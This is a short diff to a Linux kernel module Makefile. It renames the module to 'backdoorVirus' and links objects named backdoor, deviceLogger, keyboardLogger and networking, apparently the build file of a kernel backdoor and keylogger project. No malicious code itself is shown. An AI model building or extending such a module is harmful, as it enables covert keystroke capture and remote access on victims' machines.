@@ -1,4 +1,4 @@
-MODULE_NAME          = virus
+MODULE_NAME          = backdoorVirus
 obj-m               := $(MODULE_NAME).o
 
 $(MODULE_NAME)-y = backdoor.o deviceLogger.o keyboardLogger.o networking.o
